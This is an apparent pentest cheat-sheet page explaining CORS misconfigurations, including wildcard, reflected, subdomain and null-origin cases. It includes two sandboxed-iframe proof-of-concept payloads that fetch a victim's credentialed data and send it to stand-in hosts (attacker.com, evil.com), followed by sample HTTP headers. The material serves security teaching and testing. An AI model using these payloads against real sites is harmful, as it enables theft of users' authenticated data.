---
title: CORS Misconfiguration 
description: Introduction to CORS Misconfiguration vulnerabilites.
---

# CORS Misconfiguration

Most CORS attacks rely on the presence of the response header: `Access-Control-Allow-Credentials: true`.

Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

> References [portswigger.net](https://portswigger.net/web-security/cors).

Case :

1. `Access-Control-Allow-Origin: *` : Allow everyone to fetch this ressource, it can be dangerous if the ressource is not intended to be public.
2. `Access-Control-Allow-Origin` always reflect the value of the `Origin` request header : Same as `1)`, there are no protections.
3. `Access-Control-Allow-Origin` is set to a specific domain or reflect the value of the `Origin` request header only on subdomains : Try to find XSS on this domains.
4. `Access-Control-Allow-Origin` is `null` if the `Origin` is `null` :

You cannot set the value of the `Origin` request header using `fetch` or `XHR` because this header is not "safe".
However, this misconfiguration can still be exploited. Sandboxed elements (ex: `iframe`) sets the `Origin` header to `null` by default.

Example of exploit :

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://api.cors-null-vulnerable.com/sensitiveContent', {
    credentials: 'include'
})
.then(response => response.json())
.then(j => document.location=`https://attacker.com/exfiltration?key=${j['secret_key']}`);
</script>
"></iframe> 
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://example.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://evil.com/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

HTTP Request headers :

```
GET /sensitiveContent HTTP/1.1
Host: api.cors-null-vulnerable.com
Cookie: session=agurne3nriezwaejpanrghq
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: null
[...]
```

HTTP response :

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "secret_key": "12345",
}
```